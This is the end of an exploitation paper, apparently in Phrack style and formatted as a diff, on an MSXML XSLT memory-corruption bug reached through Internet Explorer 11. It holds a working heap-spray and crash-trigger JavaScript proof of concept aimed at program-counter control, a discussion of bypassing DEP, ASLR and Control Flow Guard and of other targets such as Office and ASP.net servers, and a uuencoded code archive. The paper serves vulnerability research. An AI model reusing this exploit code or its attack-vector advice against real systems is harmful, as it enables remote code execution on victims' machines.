+    xslcontent=
+    '<xsl:stylesheet
+    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" \\
+    version="1.0"><xsl:template name="main_template"
+    match="/"><xsl:for-each \\
+    select="*"><xsl:apply-templates/></xsl:for-each>
+    </xsl:template><xsl:template \\ name="xx"
+    match="x[position()]" /></xsl:stylesheet>';
+
+    srcTree=new ActiveXObject("Msxml2.DOMDocument.6.0");
+    xsltTree=new ActiveXObject("Msxml2.DOMDocument.6.0");
+    xsltTree.loadXML(xslcontent);
+    alert("crash");
+    srcTree.transformNode(xsltTree);
+  }
+
+  function selfpatch()
+  {
+    // !!! +hpa required !!!
+    // bp msxml6!xengine::stns;bp msxml6!xengine::brns;g;
+
+    var intArr = new Array;
+    intArr[0] = 0x01c0ffee; // marker // s 0 l?80000000 ee ff c0 01
+
+    var count = (0x19000000-0x20)/4; // 400 Mb
+
+    // ptr0(spray/crash)->ptr1->ptr2->ptr3->shellcode
+    // 0x3a..0x40.. -> 0x3838xxxx -> 0x3838yyyy -> patch or shellcode
+
+    var pbyte = 0x38; // play with me
+    // landing for the initial memory access:
+    var ptr12base = (pbyte<<24)+(pbyte<<16);  //0x38380000
+    var ptr1 = 0; // calculated from the page offset
+    var ptr2 = 0; // calculated from the page offset
+    var ptrcall = 0x54545454; // 0x5454xxxx -> pointers to call address
+
+    var delta = 0x3300;
+    // delta is added and removed to segregate the 1st
+    // and the 2nd memory access areas within the pattern;
+    // the additional bits above 0x1000 are used to enforce
+    // the successful 1-byte misaligned memory access
+
+    for(var i=1; i<=count; i++)
+    {
+        var i_pattern = i*4%0x1000; // index into the current page
+
+        // let's fill the spray tail with plain pointers to shellcode
+        if ( i>(0x12000000/4) ) // which defines where the 'tail' begins
+        {
+            intArr[i] = 0x00badd1e;
+            continue;
+        }
+
+        ptr1 = (i_pattern - 8 + 0x20 + delta);
+        ptr2 = (i_pattern - 4 + 0x20 - (delta&0xfff));
+
+        // misaligned memory access: fallback to code exec
+        if ( ((i*4+0x20)&0xff) == (pbyte+4) )
+            intArr[i] = ptrcall;
+
+        // well aligned memory access: restore the pointers
+        else if (i_pattern < 0x0700)
+            intArr[i] = ptr12base + ptr1;
+        else
+            intArr[i] = ptr12base + ptr2;
+    }
+
+    crash();
+    alert("Look, no calc!");
+  }
+
+  function factorial(n)
+  {
+    if (n == 0)
+    {
+        selfpatch();
+            return 1;
+        }
+    else
+        return n * factorial(n - 1);
+  }
+  </script>
+
+  </head>
+  <body onload="factorial(30);">
+    <form id="a">
+    </form>
+    <dfn id="b">
+    </dfn>
+  <div id="resTree"></div>
+
+  </body>
+  </html>
+
+
+On my testing boxes, the final proof-of-concept code yields a self-patch
+in 25% of test cases, a fallback control in 50% of cases, and the
+inevitable crash in 25% of cases. This result agrees with the theoretical
+expectation of the maximal possible gain from the offset translation
+approach. The previous code-execution only proof-of-concept code should
+yield EIP control in 100% of test cases.
+
+
+--[ 5 - Further work
+
+Taking the bug to arbitrary code execution is considered out of scope for
+this paper, but let's review the state of the art.
+
+Although the bug itself allows for the full control over the program
+counter, as it was showed with the proof-of-concept provided in the
+section 3.7, such a possibility is inherently burdened with two factors:
+
+1. A heap spray is required due to the entropic nature of the bug, that
+makes the pc control less reliable, if not...
+
+2. ...if not impossible, in the case of x64 bit systems with memory too
+wide to spray.
+
+Few years ago a browser EIP control would be considered a 'game end'. But
+today it's just the beginning of a completely different game, or rather,
+of two different games: mitigations bypass for a sandboxed code
+execution, and a sandbox bypass for the arbitrary code execution.
+
+In this game, Internet Explorer 11 is possibly the 2nd best hardened
+popular product, after the Google Chrome. Each major version of IE in the
+past years has introduced a major improvement to the system of security
+mitigations, up to the point when Microsoft was able to back and test the
+state of the product security with a $100k worth Bypass bounty, which
+says a lot. Another important indicator is the statistics for real IE11
+exploits that may be observed both ITW (in the wild) and in the
+metasploit, that's pretty scarce.
+
+Among the dozens of mitigations included in the modern IE[4], many old
+mitigations have become largely irrelevant, along with the corresponding
+classes of bugs that were gradually audited out of existence (such as
+buffer overflows and the corresponding GS stack cookie mitigation). On
+the other hand, the newer mitigations for more realistic classes of bugs
+such as Use-after-free are still too weak, e.g. the IsolatedHeap which is
+only selectively relevant to certain bugs, or MemoryProtection which
+includes the side-walks allowing to bypass it in
+practice[5]. The new Control Flow Guard included in Windows 8.1 has been
+bypassed both in the wild and in research[6] even before its full backward
+deployment on the still-popular systems like Windows 7. Only two
+mitigations before the sandbox are universally frustrating for a binary
+researcher regardless of a bug class: DEP strictly in conjunction with a
+forced ASLR.
+
+The ForceASLR mitigation was introduced in IE10, and wiped a whole class
+of easy and reliable DEP+ASLR bypass techniques which relied upon both
+system and  3rd party DLLs compiled without the explicit support for
+ASLR, allowing for constructing an executable ROP chain with pieces of
+their code at known addresses.
+
+Another opportunity that allowed to bypass DEP+ASLR in a generic way was
+utilizing executable memory pages generated by 'Just in time' compiler of
+Adobe Flash.[7] This technique had been mitigated early on, although it's
+not clear whether it's completely dead. In any case, it is limited due to
+the Adobe Flash dependency.
+
+The main[stream] technique used today to bypass DEP+ASLR is to leak some
+information about the process address space via a memory-leaking
+opportunity, typically a forced memory leak with a memory corruption
+vulnerability.[8] The most common way observed to force a memory leak is
+to corrupt a client-readable object in a certain way allowing for removal
+of the reading limits: such as a BSTR string in JavaScript (which is said
+to be removed from jscript9.dll with IE9 but can still be accessed in
+IE11[9]), various arrays in JavaScript and the Vector object in Flash. To
+achieve such a bypass, either a second vulnerability must be used, or in
+some cases, the same vulnerability can provide both a code execution and
+a memory leaking opportunity.
+
+Another branch of research worthy of a notice is the class of 'lazy'
+arbitrary code executions introduced by Chinese researchers[10], that
+takes a write-what-where vulnerability condition to enable a privileged
+JavaScript execution instead of dealing with shell codes. This is not a
+bypass technique in its own, because it still relies on a memory read/
+write vulnerability that can provide a memory leak anyway, but rather an
+example of a minimalist goal-oriented thinking as opposed to the
+overcomplicated fighting with complications.
+
+Jumping back to our bug, it is important to highlight that, because the
+target software is a global system framework rather than a direct attack
+surface, IE might be the worst possible attack vector. Instead, one might
+want to focus on covering a number of secondary vectors, that are less
+constrained with mitigations (e.g. Microsoft Office for which an ASLR
+bypass should no be an issue). As it ws shown in the Table in the section
+2.2, it's possible to trigger the bug in Office 2007 via an embedded
+JavaScript. Another possibility to mention, that MS Word has a poorly
+documented functionality for using XML templates with XSL transformation
+functionality, that might possibly be a vector
+as well. And most importantly, many internet-facing web applications
+based on ASP.net might be vulnerable with maybe a no-user-interaction
+code execution on a Windows server.
+
+
+--[ 6 - Conclusion
+
+In this paper we have thoroughly analyzed and demonstrated a certain
+control  over a curious specimen of a critical modern vulnerability in a
+core Microsoft product, which somehow remained undercover for 2 years
+despite of the publicly available trigger. We have also introduced a few
+bits of previously  unpublished  information concerning MSXML internals,
+JavaScript 9 internals, heap spraying  with images as well as general
+heap spraying in  the latest Internet Explorer.
+
+In order to analyze and control a modern binary vulnerability, a set of
+distinct operations is applied, all of which we have revisited:
+
+impact vectors research,
+crash dump analysis,
+exploitability estimation,
+patch binary analysis,
+and root cause analysis.
+
+A seemingly uninteresting bug, previously discarded by automated tools
+and superficial analysis, may turn out to be exploitable as a result of
+an all-round investigation.
+
+There may exist a multitude of ways to remotely reach a particular
+vulnerability, apart from the most obvious (and likely the most
+constrained) attack vector.
+
+Deducing any specific vulnerability details from a vulnerability patch
+only, such  as the triggering inputs or the root cause, may be extremely
+hard or impossible  due to both the binary diffing complexities of large
+amounts of binary code  modifications and the possibility of a seemingly
+irrelevant code being changed.
+
+A bit-accurate precision of the crafted input may be required to take a
+vulnerability condition such as a read access violation to the control of
+the program counter through the chain of code constraints along the
+execution path, as well as an extensive grasp of the operating system
+internals and a pages-accurate control of the target process memory space.
+
+Bits of useful data may be leaked about the crashing context through
+ordinary  memory access operations, even when no explicit information
+leaking opportunity is provided by the vulnerability.
+
+Internet Explorer 11 memory may be filled quickly with controlled data
+that would be positioned predictably enough to control a highly entropic
+vulnerability, despite the allocation randomization as well as the
+possible anti heap-spraying mechanisms in place.
+
+Microsoft XSLT technology is implemented as a simple virtual machine,
+taking the input XSL code through the abstract syntax tree generation
+with the ASTCodeGen class to 'XCode' compilation with the XCodeGen class,
+to stateful frame-based computation with the XEngine class.
+
+A huge memory spray may be contained in bitmaps, compressed into the PNG
+format with zero loss.
+
+A memory leaking opportunity will be required to take the vulnerability
+from EIP control to shellcode execution.
+
+
+--[ 7 - Thanks
+
+Nicolas for publishing the repro trigger, my ex-boyfriend for the endless
+supply of cat photos and Nutella, and my grandma for her loving support.
+
+
+--[ 8 - References
+
+  [1] Microsoft Security Bulletin MS13-002 - Critical - TechNet
+      https://technet.microsoft.com/library/security/ms13-002
+  [2] Nicolas Gregoire, "Mutation-based fuzzing of XSLT engines"
+      http://www.agarri.fr/kom/archives/2013/02/25/
+      mutation-based_fuzzing_of_xslt_engines/index.html
+  [3] Greg MacManus, Michael Sutton, "Punk Ode: Hiding Shellcode in Plain
+      Sight"
+      https://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Sutton.pdf
+  [4] Ken Johnson, Matt Miller, "Exploit mitigation improvements in
+      Windows 8"
+      https://media.blackhat.com/bh-us-12/Briefings/M_Miller/
+      BH_US_12_Miller_Exploit_Mitigation_Slides.pdf
+  [5] Yuki Chen, "The Birth of a Complete IE11 Exploit Under the New
+      Exploit Mitigations"
+      https://www.syscan.org/index.php/download/
+  [6] Zhang Yunhai, "Bypass Control Flow Guard comprehensively"
+      https://www.blackhat.com/docs/us-15/materials/us-15-Zhang-Bypass-
+      Control-Flow-Guard-Comprehensively-wp.pdf
+  [7] Dion Blazakis, "Interpreter Exploitation. Pointer Inference and JIT
+      Spraying"
+      http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf
+  [8] Fermin J. Serna, "The info leak era on software exploitation"
+      https://media.blackhat.com/bh-us-12/Briefings/Serna/
+      BH_US_12_Serna_Leak_Era_Slides.pdf
+  [9] Yang Yu, "Write Once, Pwn Anywhere"
+      https://www.blackhat.com/docs/us-14/materials/us-14-Yu-Write-Once-
+      Pwn-Anywhere.pdf
+  [10] Yuki Chen, "Exploit IE using scriptable ActiveX controls"
+      http://www.slideshare.net/xiong120/exploit-ie-using-scriptable-
+      active-x-controls-version-english
+
+
+--[ 9 - Code
+
+begin 644 code.tar.gz
+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
+0!@8&!@8U_@9W7BIU`%``````
+`
+end
+
+
+--[ EOF
